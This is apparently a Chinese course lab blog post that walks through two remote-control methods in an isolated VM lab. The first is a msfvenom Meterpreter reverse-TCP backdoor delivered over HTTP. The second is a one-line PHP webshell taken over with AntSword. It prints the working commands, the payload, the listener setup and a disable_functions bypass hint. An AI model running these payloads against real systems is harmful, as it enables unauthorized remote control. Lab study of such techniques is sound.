---
title: Meterpreter 被控端与一句话木马：两种远程控制手法复现
date: 2026-11-08 22:30:00
categories: [网络渗透]
tags: [msfvenom, Metasploit, Meterpreter, 微步沙箱, 一句话木马, 蚁剑, 远程控制]
description: 两条远程控制路径的完整复现——用 msfvenom 生成 Windows 被控端并投递到靶机回连拿 Meterpreter 会话，再把 payload 送进微步沙箱看检测结论；另一条是写一句话木马、通过 HTTP 传参执行命令，再用蚁剑图形化接管。
---

远程控制是渗透测试的最后一步，拿 shell 的方式有很多，本文做的是最经典的两种：

- **二进制后门**：`msfvenom` 生成一个 `reverse_tcp` 的 exe，诱导靶机运行，目标主动回连攻击机，拿到 Meterpreter 会话；
- **Web 一句话木马**：往 Web 目录里写一段 PHP，通过 HTTP 请求把命令传给 `system()` 执行，再用蚁剑做图形化管理。

两条路径的投递方式不同，但本质相同——都是把命令执行的入口交给攻击者，区别只在于入口是一个 exe 还是一个 `.php` 文件。

<!-- more -->

## 环境

| 角色 | 系统 | IP | 说明 |
|------|------|-----|------|
| 攻击机 | Kali Linux | 192.168.220.134 | 已启 Apache + PHP，第二节用来承载一句话木马 |
| 靶机 | Windows 10 x64 | 192.168.220.133 | 已装 phpStudy，可作客户端访问 Web 服务 |

两台虚拟机同网段互通。开工前先把靶机的 Defender 实时保护关掉，否则 exe 一落地就被隔离。

> 本节有一个环境上的调整：靶机上 phpStudy 的 PHP 解析始终没跑通（站点把 `shell.php` 当普通文件返回），于是改用 Kali 的 Apache + PHP 承载木马。变的是"Web 服务器在哪台机器"，木马本身、传参方式、蚁剑的接入流程都没变；`whoami` 的返回值正好把"代码在哪台机器上执行"这件事暴露得很清楚。

## 一、生成被控端

`msfvenom` 的参数就四个关键项：payload 选 `windows/meterpreter/reverse_tcp`，`LHOST` 填**攻击机自己的 IP**，`LPORT` 随便挑一个没占用的（本例 5000），`-f exe` 指定输出格式。

第一次按博客的路径写，直接报错：

![目录不存在导致生成失败](/img/ch6-rc-01.png)

```
Error: No such file or directory @ rb_sysopen - /home/user/test/payload.exe
```

`-o` 后面的目录必须先存在，`msfvenom` 不会自己创建。改成 `/root` 再试，又撞上权限：

![非 root 用户写 /root 被拒](/img/ch6-rc-02.png)

```
Error: Permission denied @ rb_sysopen - /root/payload.exe
```

Kali 默认用普通用户 `kali` 登录，写 `/root` 需要 sudo。省事的做法是**直接输出到当前目录**，这样后面起 HTTP 服务时文件就在手边：

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.220.134 LPORT=5000 -f exe -o payload.exe
```

![生成成功](/img/ch6-rc-03.png)

```
Payload size: 355 bytes
Final size of exe file: 7168 bytes
Saved as: payload.exe
```

7168 字节，比一张图片还小——这就是后面它容易混进正常文件、也不容易被注意到的原因。

## 二、开监听

被控端是 `reverse_tcp`，方向是**靶机 → 攻击机**，所以必须先在攻击机挂好监听等它连回来。

```bash
msfconsole
```

![启动 msfconsole](/img/ch6-rc-04.png)

```bash
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.220.134
set LPORT 5000
exploit
```

![handler 就绪](/img/ch6-rc-05.png)

```
[*] Started reverse TCP handler on 192.168.220.134:5000
```

看到这一行才算就绪。`LHOST` / `LPORT` 必须和 `msfvenom` 里写的**完全一致**，改了一个忘了另一个，就会永远等不到会话。

## 三、把 payload 送进靶机

原本想用 Apache 直接把文件发出去，但 `cd` 进 `/home/user/test` 失败、`cp` 也找不到文件——payload 其实生成在当前目录下：

![路径不存在导致拷贝失败](/img/ch6-rc-06.png)

所以更省事的路子是**用 Python 起一个临时 HTTP 服务**，把当前目录当成下载站。顺带把 Apache 也启起来，后面放一句话木马要用：

![启动 apache2](/img/ch6-rc-07.png)

```bash
python3 -m http.server 8080
```

![起 HTTP 服务](/img/ch6-rc-08.png)

回到 Windows 靶机，用 PowerShell 下载（比浏览器点下载更可控，也不会被"是否保留此文件"拦一道）：

```powershell
Invoke-WebRequest -Uri "http://192.168.220.134:8080/payload.exe" -OutFile "C:\Users\test\Desktop\payload.exe"
```

![靶机下载 payload](/img/ch6-rc-09.png)

Kali 这边能看到一条来自 `192.168.220.133` 的请求，说明文件确实被取走了：

![HTTP 服务日志](/img/ch6-rc-10.png)

```
192.168.220.133 - - [08/Nov/2026 08:14:46] "GET /payload.exe HTTP/1.1" 200 -
```

下载完成后在靶机上就能搜到这个文件：

![payload.exe 落地](/img/ch6-rc-11.png)

双击运行——**没有任何窗口弹出**，任务管理器里也只是一个同名进程一闪而过。这不是没运行，而是 Meterpreter 把自身注入到进程内存里执行，这也是它比普通木马难被发现的原因。

## 四、送进沙箱看检测结论

把 `payload.exe` 从靶机拷回物理机，上传到微步在线沙箱（<https://s.threatbook.com/>）：

![微步沙箱检测结果](/img/ch6-rc-12.png)

几个关键读数：

- **文件类型** `PE32 executable (GUI) Intel 80386`，7 KB，5 个节区；
- **引擎检出 11/28**，威胁分类「木马」，家族标为 `Agent`；
- **SHA256** `d0d0a8537c90ab2b25dd62d8444414b21cdcce3e9978221c6aeda39ea951005`。

值得说明的是：这个文件在本地跑起来毫无反应、行为上也看不出异常，但静态特征早就被引擎识别了——**免杀不是改个名字就能解决的**，`-e` 加编码器对现代检测基本无效。

## 五、一句话木马

换一条路径：不投递 exe，而是借网站的解析能力执行代码。先写一个 PHP 文件：

```bash
echo '<?php system($_REQUEST["cmd"]);?>' > shell.php
```

![写一句话木马](/img/ch6-rc-13.png)

这段代码只有一行：把 HTTP 请求里的 `cmd` 参数取出来，交给 `system()` 执行，再把输出回显。它没有任何防护，也不需要认证——**只要这个文件能被访问到，就等于那台 Web 服务器的命令执行权限**。

把它复制进承载 Web 服务的机器（本例是 Kali）的网站根目录：

```bash
sudo cp shell.php /var/www/html/
```

![复制到网站目录](/img/ch6-rc-14.png)

再从 Windows 靶机这一侧访问它，看 PHP 有没有真的被执行：

```powershell
Invoke-WebRequest -Uri "http://192.168.220.134/shell.php?cmd=whoami" -UseBasicParsing | Select-Object -ExpandProperty Content
```

![命令执行成功](/img/ch6-rc-15.png)

返回 `www-data`——这是 Linux 下 Apache 的运行账户，说明命令是在**承载 `shell.php` 的那台机器上**执行的，而不是发出请求的 Windows 端。反过来，如果 PHP 没被解析，拿回来的会是源码本身或者直接触发下载，这一点下面"踩过的坑"里还会提到。`whoami` 只是验证，换成 `ipconfig`、`dir`、`type` 一样能跑。

## 六、用蚁剑接管

手工拼 URL 太麻烦，实际的渗透测试里一般用蚁剑（AntSword）这类图形化工具。它只是个管理端，装在哪台机器上都不影响——连的仍然是 `shell.php` 所在的那台服务器。

从物理机下载蚁剑压缩包，拷进靶机（或者直接在物理机解压后把整个目录拖进虚拟机），解压后是这样一堆文件：

![蚁剑解压目录](/img/ch6-rc-16.png)

运行 `AntSword.exe`，第一次启动要选一个工作目录存放数据，随便建个空文件夹给它：

![选择工作目录](/img/ch6-rc-17.png)

选好之后它会自己初始化，下载依赖：

![初始化中](/img/ch6-rc-18.png)

初始化完成进入主界面，左侧是数据管理，右侧是分类目录：

![蚁剑主界面](/img/ch6-rc-19.png)

右键「添加数据」，把木马地址和连接密码填进去：

![添加数据](/img/ch6-rc-20.png)

| 字段 | 值 |
|---|---|
| URL 地址 | `http://192.168.220.134/shell.php` |
| 连接密码 | `cmd` |
| 编码设置 | UTF8 |
| 连接类型 | PHP |
| 编码器 | default |

**连接密码必须和木马里取的参数名一致**——本例木马读的是 `$_REQUEST["cmd"]`，所以密码填 `cmd`。填 `pass` 会一直提示连接失败，这是新手最常卡住的一步。

点「测试连接」，通过后保存，双击进入就能看到文件管理和虚拟终端，等同于直接登录 `shell.php` 所在的那台服务器。

## 小结

两条路径对比下来，差别其实在入口：

| | 二进制后门 | 一句话木马 |
|---|---|---|
| 依赖条件 | 目标执行 exe | 目标有可写的 Web 目录 + PHP |
| 通信方向 | 靶机主动回连攻击机 | 客户端主动请求 Web 服务器 |
| 隐蔽性 | 无进程窗口、内存执行 | 就是一个普通 php 文件，混在网站里 |
| 检测难度 | 静态特征明显，沙箱秒出结论 | 需要看代码内容或异常请求 |

对防守方来说，这两条给出的启示是一样的：**执行入口比漏洞本身更值得关注**。exe 能落地、网站目录可写，这两件事任何一件成立，后面被控只是时间问题。

## 踩过的坑

**`msfvenom -o` 的路径。** 目录不存在报 `No such file or directory`，写到 `/root` 报 `Permission denied`，最稳的是输出到当前目录。

**先开监听再运行 exe。** `reverse_tcp` 只连一次，监听还没起来时 exe 连不上会静默退出，看起来像"运行了没反应"。

**Defender 会中途截胡。** 不只是运行时被杀，下载那一刻就可能被隔离。做实验前先关实时保护，或者把目录加进排除项。

**phpStudy 的 PHP 没被解析。** 这次 Windows 侧的站点始终把 `shell.php` 当普通文件返回，浏览器里能看到源码、或者直接触发下载。排查顺序：站点根目录是否指对（`WWW` 下确实有这个文件）→ Apache/Nginx 里 PHP 模块是否启用、`php.ini` 路径是否正确 → 80 端口有没有被 IIS 或其他站点占用。如果一时确认不下来，换一台本来就在跑 PHP 的服务（本例最后用了 Kali 的 Apache）同样能完成木马的验证，不必死磕环境。

**连接密码要跟木马对上。** 蚁剑里的密码不是随便设的，必须等于木马中 `$_REQUEST['xxx']` 的 `xxx`。

**`disable_functions`。** 一句话木马本身对 PHP 版本几乎无要求，但如果 `php.ini` 里禁了 `system`，命令会返回空，而不是报错——换 `assert`、`call_user_func` 之类的写法可以绕。

## 边界声明

所有操作均在本机 VMware 搭建的隔离环境中完成：攻击机与靶机处于同一 NAT 网段，靶机为自行安装的 Windows 10，不涉及任何真实业务系统；微步沙箱检测的是自己生成的样本，未上传任何真实数据。文中技术内容仅用于课程实验与安全原理学习，请勿用于未授权的目标。
